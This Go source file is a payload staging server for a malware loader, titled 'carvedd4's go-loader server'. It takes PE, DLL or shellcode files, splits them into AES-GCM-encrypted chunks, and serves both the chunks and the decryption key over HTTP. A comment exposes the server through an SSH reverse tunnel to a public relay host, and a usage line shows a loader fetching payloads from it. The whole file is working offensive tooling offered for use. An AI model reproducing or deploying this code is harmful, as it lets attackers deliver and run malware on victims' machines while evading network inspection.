package main

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/sha256"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"flag"
	"fmt"
	"github.com/Binject/debug/pe"
	"github.com/google/uuid"
	"io"
	"io/ioutil"
	"log"
	"net/http"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"sync"
	"time"
)

// ssh -p 443 -R0:localhost:8000 tcp@a.pinggy.io
// usage program.exe -pe|-dll|-shellcode -url http://<generated-link>/payloads/<filename>
const (
	DefaultChunkSize = 16384 
	MaxChunkSize     = 65536 
	KeyLength        = 32    
	NonceLength      = 12    
	DefaultPort      = 8000  
	// CHANGE THIS AFTER RUNNING THE SSH TUNNEL :3
	PinggyLink       = "http://<generated-link>/payloads/" 
)


var (
	fileKeyMap     = make(map[string][]byte) 
	fileChunksMap  = make(map[string][][]byte) 
	fileMetadataMap = make(map[string]*FileMetadata) 
	mutex          sync.RWMutex
)


type FileMetadata struct {
	ID            string    `json:"id"`
	OriginalName  string    `json:"name"`
	Size          int       `json:"size"`
	ChunkCount    int       `json:"chunks"`
	ChunkSize     int       `json:"chunk_size"`
	Hash          string    `json:"hash"`
	Timestamp     time.Time `json:"timestamp"`
	Encrypted     bool      `json:"encrypted"`
	Algorithm     string    `json:"algorithm"`
}

type FileInfo struct {
	FileID     string `json:"file_id"`
	Key        string `json:"key"`         
	ChunkCount int    `json:"chunk_count"`
	ChunkSize  int    `json:"chunk_size"`
	TotalSize  int    `json:"total_size"`
}

type ChunkResponse struct {
	Chunk       string `json:"chunk"`       
	ChunkNumber int    `json:"chunk_number"`
	TotalChunks int    `json:"total_chunks"`
	FileID      string `json:"file_id"`
}


func generateKey(length int) ([]byte, error) {
	key := make([]byte, length)
	_, err := rand.Read(key)
	if err != nil {
		return nil, err
	}
	return key, nil
}

func calculateSHA256(data []byte) string {
	hash := sha256.Sum256(data)
	return hex.EncodeToString(hash[:])
}

func encryptChunk(chunk []byte, key []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}

	aesGCM, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}

	nonce := make([]byte, NonceLength)
	if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
		return nil, err
	}

	ciphertext := aesGCM.Seal(nil, nonce, chunk, nil)
	
	result := append(nonce, ciphertext...)
	
	return result, nil
}


func processFile(filePath string, chunkSize int) (string, error) {
	fileBytes, err := ioutil.ReadFile(filePath)
	if err != nil {
		return "", fmt.Errorf("error reading file: %v", err)
	}

	extension := strings.ToLower(filepath.Ext(filePath))
	if extension != ".bin" {
		_, err = pe.NewFile(bytes.NewReader(fileBytes))
		if err != nil {
			return "", fmt.Errorf("error parsing PE file: %v", err)
		}
	}

	fileID := uuid.New().String()

	key, err := generateKey(KeyLength)
	if err != nil {
		return "", fmt.Errorf("error generating encryption key: %v", err)
	}

	var chunks [][]byte
	for i := 0; i < len(fileBytes); i += chunkSize {
		end := i + chunkSize
		if end > len(fileBytes) {
			end = len(fileBytes)
		}

		chunk := fileBytes[i:end]
		encryptedChunk, err := encryptChunk(chunk, key)
		if err != nil {
			return "", fmt.Errorf("error encrypting chunk %d: %v", i/chunkSize, err)
		}

		chunks = append(chunks, encryptedChunk)
	}

	metadata := &FileMetadata{
		ID:            fileID,
		OriginalName:  filepath.Base(filePath),
		Size:          len(fileBytes),
		ChunkCount:    len(chunks),
		ChunkSize:     chunkSize,
		Hash:          calculateSHA256(fileBytes),
		Timestamp:     time.Now(),
		Encrypted:     true,
		Algorithm:     "AES-GCM-256",
	}

	mutex.Lock()
	fileKeyMap[fileID] = key
	fileChunksMap[fileID] = chunks
	fileMetadataMap[fileID] = metadata
	mutex.Unlock()

	log.Printf("Processed file '%s' as ID '%s': %d bytes, %d chunks",
		metadata.OriginalName, fileID, metadata.Size, metadata.ChunkCount)

	return fileID, nil
}

func handlePayloadRequest(w http.ResponseWriter, r *http.Request) {
	path := strings.TrimPrefix(r.URL.Path, "/payloads/")
	if path == "" || path == "/" || path == "/payloads" {	
		handlePayloadListing(w, r)
		return
	}
	
	filename := filepath.Base(path)
	filePath := filepath.Join("./payloads", filename)
	if _, err := os.Stat(filePath); os.IsNotExist(err) {
		http.Error(w, "File not found", http.StatusNotFound)
		return
	}

	var fileID string
	mutex.RLock()
	for id, metadata := range fileMetadataMap {
		if metadata.OriginalName == filename {
			fileID = id
			break
		}
	}
	mutex.RUnlock()

	if fileID == "" {
		var err error
		fileID, err = processFile(filePath, DefaultChunkSize)
		if err != nil {
			log.Printf("Error processing file: %v", err)
			http.Error(w, "Error processing file", http.StatusInternalServerError)
			return
		}
	}

	mutex.RLock()
	metadata := fileMetadataMap[fileID]
	key := fileKeyMap[fileID]
	mutex.RUnlock()
	
	response := FileInfo{
		FileID:     fileID,
		Key:        base64.StdEncoding.EncodeToString(key),
		ChunkCount: metadata.ChunkCount,
		ChunkSize:  metadata.ChunkSize,
		TotalSize:  metadata.Size,
	}

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(response)
	
	log.Printf("Payload info sent: %s (ID=%s), %d chunks available", filename, fileID, metadata.ChunkCount)
}

func handleChunkRequest(w http.ResponseWriter, r *http.Request) {
	fileID := r.URL.Query().Get("id")
	if fileID == "" {
		http.Error(w, "Missing file ID parameter", http.StatusBadRequest)
		return
	}

	chunkNumStr := r.URL.Query().Get("chunk")
	if chunkNumStr == "" {
		http.Error(w, "Missing chunk parameter", http.StatusBadRequest)
		return
	}

	chunkNum, err := strconv.Atoi(chunkNumStr)
	if err != nil {
		http.Error(w, "Invalid chunk number", http.StatusBadRequest)
		return
	}

	mutex.RLock()
	chunks, ok := fileChunksMap[fileID]
	totalChunks := 0
	if ok {
		totalChunks = len(chunks)
	}
	mutex.RUnlock()

	if !ok {
		http.Error(w, "File not found", http.StatusNotFound)
		return
	}

	if chunkNum < 0 || chunkNum >= totalChunks {
		http.Error(w, "Chunk index out of range", http.StatusBadRequest)
		return
	}

	mutex.RLock()
	chunk := chunks[chunkNum]
	mutex.RUnlock()

	response := ChunkResponse{
		Chunk:       base64.StdEncoding.EncodeToString(chunk),
		ChunkNumber: chunkNum,
		TotalChunks: totalChunks,
		FileID:      fileID,
	}

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(response)
	
	log.Printf("Chunk request: ID=%s, Chunk=%d/%d", fileID, chunkNum, totalChunks)
}

func handlePayloadListing(w http.ResponseWriter, r *http.Request) {
	files, err := ioutil.ReadDir("./payloads")
	if err != nil {
		log.Printf("Error reading payloads directory: %v", err)
		http.Error(w, "Error reading payloads directory", http.StatusInternalServerError)
		return
	}

	type PayloadInfo struct {
		Name string `json:"name"`
		URL  string `json:"url"`
	}
	
	payloadList := make([]PayloadInfo, 0, len(files))
	for _, file := range files {
		if !file.IsDir() {
			payloadList = append(payloadList, PayloadInfo{
				Name: file.Name(),
				URL:  fmt.Sprintf("%s/payloads/%s", PinggyLink, file.Name()),
			})
		}
	}

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]interface{}{
		"payloads": payloadList,
		"tunnel":   PinggyLink,
	})
	
	log.Printf("Payload listing requested, found %d files", len(payloadList))
}

func main() {
	port := flag.Int("port", DefaultPort, "Port to listen on")
	payloadDir := flag.String("payloads", "./payloads", "Directory containing payload files")
	flag.Parse()

	if _, err := os.Stat(*payloadDir); os.IsNotExist(err) {
		if err := os.MkdirAll(*payloadDir, 0755); err != nil {
			log.Fatalf("Failed to create payloads directory: %v", err)
		}
		log.Printf("Created payloads directory: %s", *payloadDir)
	}

	http.HandleFunc("/payloads/", handlePayloadRequest)
	http.HandleFunc("/payloads", handlePayloadRequest)
	http.HandleFunc("/chunk", handleChunkRequest)
	
	http.HandleFunc("/health", func(w http.ResponseWriter, r *http.Request) {
		fmt.Fprintf(w, "OK")
	})

	http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		if r.URL.Path != "/" {
			http.NotFound(w, r)
			return
		}
		html := `
		<html>
			<head>
				<title>carvedd4's go-loader server</title>
				<style>
					body { font-family: monospace; margin: 40px; line-height: 1.6; background-color: #000; color: #fff; }
					h1 { font-size: 24px; }
					code { background-color: #000; padding: 2px 4px; border: 1px solid #fff; }
					.container { max-width: 800px; margin: 0 auto; }
				</style>
			</head>
			<body>
				<div class="container">
					<h1>carvedd4's go-loader server</h1>
					<p>Server is running over TCP tunnel: ` + PinggyLink + `</p>
					<p>Access payloads directly at: <code>` + PinggyLink + `/payloads/[filename]</code></p>
					<p>Get chunks at: <code>` + PinggyLink + `/chunk?id=[file_id]&chunk=[chunk_number]</code></p>
					<p>List available payloads: <code>` + PinggyLink + `/payloads</code></p>
				</div>
			</body>
		</html>
		`
		fmt.Fprintf(w, html)
	})

	addr := fmt.Sprintf(":%d", *port)
	log.Printf("Starting server on port %d", *port)
	log.Printf("Tunnel access via: %s", PinggyLink)
	log.Printf("Serving payloads from directory: %s", *payloadDir)
	
	err := http.ListenAndServe(addr, nil)
	log.Fatal(err)
}
